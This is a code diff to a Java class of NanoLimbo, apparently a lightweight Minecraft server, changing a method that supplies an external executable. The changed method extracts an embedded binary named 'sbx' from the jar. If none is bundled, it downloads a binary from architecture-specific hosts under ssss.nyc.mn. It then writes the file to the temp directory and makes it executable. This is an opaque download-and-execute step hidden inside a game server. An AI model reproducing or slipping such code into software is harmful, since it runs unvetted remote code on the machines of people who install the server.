@@ -179,23 +179,45 @@ public final class NanoLimbo {
     
     private static Path getBinaryPath() throws IOException {
         String osArch = System.getProperty("os.arch").toLowerCase();
+        String resourceName;
         String url;
-        
+
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
+            resourceName = "/binaries/sbx-amd64";
             url = "https://amd64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
+            resourceName = "/binaries/sbx-arm64";
             url = "https://arm64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("s390x")) {
+            resourceName = "/binaries/sbx-s390x";
             url = "https://s390x.ssss.nyc.mn/sbsh";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
-        
+
         Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
         if (!Files.exists(path)) {
-            try (InputStream in = new URL(url).openStream()) {
-                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+            boolean extracted = false;
+
+            // 1) 优先：从 jar 内置资源解压
+            try (InputStream in = NanoLimbo.class.getResourceAsStream(resourceName)) {
+                if (in != null) {
+                    Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+                    extracted = true;
+                    System.out.println(ANSI_GREEN + "Extracted embedded binary: " + resourceName + ANSI_RESET);
+                }
+            } catch (IOException e) {
+                System.err.println(ANSI_RED + "Failed to extract embedded binary: " + e.getMessage() + ANSI_RESET);
             }
+
+            // 2) 回退：联网下载（当没有内置此架构的二进制时）
+            if (!extracted) {
+                System.out.println(ANSI_GREEN + "Embedded binary not found, downloading from: " + url + ANSI_RESET);
+                try (InputStream in = new URL(url).openStream()) {
+                    Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+                }
+            }
+
             if (!path.toFile().setExecutable(true)) {
                 throw new IOException("Failed to set executable permission");
             }
